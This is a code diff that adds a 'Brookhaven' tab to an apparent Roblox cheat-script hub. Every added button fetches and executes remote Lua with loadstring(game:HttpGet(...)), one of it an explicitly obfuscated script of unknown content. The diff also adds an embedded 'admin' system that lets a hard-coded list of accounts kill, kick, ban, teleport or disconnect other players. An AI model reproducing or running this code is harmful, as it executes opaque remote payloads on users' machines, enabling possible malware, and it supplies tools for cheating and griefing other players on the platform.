@@ -362,6 +362,224 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4Fo
    end,
 })
 
+local BrookhavenTab = Window:CreateTab("Brookhaven", nil) -- Title, Image
+local BrookhavenSection = BrookhavenTab:CreateSection("General Brookhaven Scripts")
+
+local Button = BrookhavenTab:CreateButton({
+   Name = "Sys Admin (In Spanish)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Uu/refs/heads/main/obfuscated_script-1749677887559.lua.txt"))()
+
+-- Admin System Unificado com Disco
+local Ghostplayer = "seth_ka123"
+local Admins = {
+    ["MeDKS3"]=true, ["nolyhaha"]=true, ["djekejsn"]=true,
+    ["Packj0"]=true, ["adm2"]=true, ["kit_cynALT"]=true,
+    ["fandofgg"]=true, ["adm5"]=true, ["adm6"]=true,
+    ["adm7"]=true, ["Pxrple001"]=true, ["bestgamer_pogi24"]=true,
+    ["EC_BOT1"]=true, ["FEWithoutEffort"]=true
+}
+
+local banFile = "banlist.txt"
+local banList = {}
+local HttpService = game:GetService("HttpService")
+
+-- Carrega/Salva banlist
+local function loadBanList()
+    if isfile(banFile) then
+        banList = HttpService:JSONDecode(readfile(banFile))
+    else
+        writefile(banFile, HttpService:JSONEncode({}))
+    end
+end
+
+local function saveBanList()
+    writefile(banFile, HttpService:JSONEncode(banList))
+end
+
+loadBanList()
+
+-- Envia mensagem via chat
+local function sendMessage(msg)
+    local svc = game:GetService("TextChatService")
+    if svc.ChatVersion == Enum.ChatVersion.TextChatService then
+        svc.TextChannels.RBXGeneral:SendAsync(msg)
+    else
+        game:GetService("ReplicatedStorage")
+            .DefaultChatSystemChatEvents
+            .SayMessageRequest:FireServer(msg, "All")
+    end
+end
+
+-- Define comandos
+local function setupAdminCommands(plr)
+    plr.Chatted:Connect(function(msg)
+        local cmd = msg:lower()
+        local char = plr.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        local function apply(filter, action)
+            for _, t in ipairs(game.Players:GetPlayers()) do
+                if not Admins[t.Name] and filter(t) then
+                    action(t)
+                end
+            end
+        end
+
+        if cmd == ":kill all" then
+            apply(
+                function(p) return p.Character and p.Character:FindFirstChild("Humanoid") end,
+                function(p) p.Character.Humanoid.Health = 0 end
+            )
+
+        elseif cmd:sub(1,6) == ":kill " then
+            local name = cmd:sub(7)
+            apply(
+                function(p) return p.Name:lower() == name and p.Character and p.Character:FindFirstChild("Humanoid") end,
+                function(p) p.Character.Humanoid.Health = 0 end
+            )
+
+        elseif cmd == ":bring all" then
+            apply(
+                function(p) return p.Character and p.Character:FindFirstChild("HumanoidRootPart") end,
+                function(p) p.Character.HumanoidRootPart.CFrame = hrp.CFrame + Vector3.new(3,0,0) end
+            )
+
+        elseif cmd:sub(1,8) == ":bring " then
+            local name = cmd:sub(9)
+            apply(
+                function(p) return p.Name:lower() == name and p.Character and p.Character:FindFirstChild("HumanoidRootPart") end,
+                function(p) p.Character.HumanoidRootPart.CFrame = hrp.CFrame + Vector3.new(3,0,0) end
+            )
+
+        elseif cmd == ":sit" then
+            apply(
+                function(p) return p.Character and p.Character:FindFirstChildOfClass("Humanoid") end,
+                function(p) p.Character:FindFirstChildOfClass("Humanoid").Sit = true end
+            )
+
+        elseif cmd == ":jump" then
+            apply(
+                function(p) return p.Character and p.Character:FindFirstChildOfClass("Humanoid") end,
+                function(p) p.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping) end
+            )
+
+        elseif cmd == ":kick all" then
+            apply(
+                function() return true end,
+                function(p) p:Kick("Kicked by Admin") end
+            )
+
+        elseif cmd:sub(1,6) == ":kick " then
+            local name = cmd:sub(7)
+            apply(
+                function(p) return p.Name:lower() == name end,
+                function(p) p:Kick("Kicked by Admin") end
+            )
+
+        elseif cmd == ":ban all" then
+            apply(
+                function() return true end,
+                function(p)
+                    banList[p.DisplayName] = true
+                    saveBanList()
+                    p:Kick("Banned by Admin")
+                end
+            )
+
+        elseif cmd == ":void" then
+            apply(
+                function(p) return p.Character and p.Character:FindFirstChild("HumanoidRootPart") end,
+                function(p) p.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0) end
+            )
+
+        elseif cmd == ":showusers" then
+            for _, u in ipairs(game.Players:GetPlayers()) do
+                sendMessage("User: " .. u.Name .. " | Display: " .. u.DisplayName)
+            end
+
+        elseif cmd:sub(1,5) == ":say " then
+            local txt = msg:sub(6)
+            sendMessage(txt)
+
+        elseif cmd == ":exit all" or cmd == ":exit" then
+            game:Shutdown()
+
+        elseif cmd == ":rejoin" then
+            local TS = game:GetService("TeleportService")
+            TS:TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+
+        -- Disco / Undisco
+        elseif cmd == ":disco" then
+            local L = game:GetService("Lighting")
+            if not L:FindFirstChild("DiscoRunning") then
+                local marker = Instance.new("BoolValue")
+                marker.Name = "DiscoRunning"
+                marker.Parent = L
+                task.spawn(function()
+                    while marker.Parent do
+                        L.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
+                        L.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
+                        task.wait(0.2)
+                    end
+                end)
+            end
+
+        elseif cmd == ":undisco" then
+            local L = game:GetService("Lighting")
+            local m = L:FindFirstChild("DiscoRunning")
+            if m then m:Destroy() end
+            L.ColorShift_Top = Color3.new(0, 0, 0)
+            L.ColorShift_Bottom = Color3.new(0, 0, 0)
+        end
+    end)
+end
+
+-- Inicialização para quem já entrou
+for _, p in ipairs(game.Players:GetPlayers()) do
+    if banList[p.DisplayName] then
+        p:Kick("Você está banido.")
+    elseif Admins[p.Name] then
+        setupAdminCommands(p)
+    end
+end
+
+-- Listener para novos jogadores
+game.Players.PlayerAdded:Connect(function(p)
+    if banList[p.DisplayName] then
+        p:Kick("Você está banido.")
+    elseif Admins[p.Name] then
+        setupAdminCommands(p)
+    end
+end)
+
+-- Flag no ReplicatedStorage
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+if not ReplicatedStorage:FindFirstChild("Admin") then
+    local s = Instance.new("StringValue")
+    s.Name = "Admin"
+    s.Value = "Admin Ativo"
+    s.Parent = ReplicatedStorage
+end 
+
+   end,
+})
+
+local Button = BrookhavenTab:CreateButton({
+   Name = "The Darkones (Best for Killing and etc)",
+   Callback = function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Brookhaven-30409"))()
+   end,
+})
+
+local Button = BrookhavenTab:CreateButton({
+   Name = "Drip Client",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Source.lua"))()
+   end,
+})
+
 local MurderMystery2Tab = Window:CreateTab("Murder Mystery 2", nil) -- Title, Image
 local MurderMystery2Section = MurderMystery2Tab:CreateSection("For MM2! (Buggy)")
 
